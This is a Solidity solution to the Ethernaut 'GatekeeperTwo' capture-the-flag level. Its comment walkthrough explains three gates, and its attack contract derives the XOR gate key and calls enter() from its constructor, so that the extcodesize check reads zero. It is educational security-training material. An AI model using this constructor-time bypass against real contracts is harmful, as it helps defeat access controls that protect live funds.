/*
Tools needed for this level:
- Console
- Remix IDE

* Gate One: For passing this we simply need to attack GatekeeperTwo from another contract,
  similar to the GatekeeperOne level.
* Gate Two: We must attack GatekeeperTwo contract in the constructor because when the contract
  initializes deployment, it has an address, but the code cannot be accessed until it is 
  fully deployed. This way, this contract's code will meet the requirement of being zero.
* Gate Three: For passing this, we'll need to switch the elements in the XOR (^) operator
  and obtain the key.

1.- Deploy this contract (GKTwoAttack) with Remix using the Injected Web3 environment
passing Ethernaut's GatekeeperTwo contract address.
3.- Check if you are entrant:
            await contract.entrant()
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GKTwoAttack {
	constructor(address GKTwoAddr) public {
		// If we know that a ^ b = c and that a ^ c = b,
		// we can switch places betweeen C and B for finding B.
		//                        a                                 ^         b        ==      c
		// (uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1)
		bytes8 _gateKey = bytes8(
			uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)
		);

		// With the adquired key, we call the enter function via encodeWithSignature
		GKTwoAddr.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));
	}
}
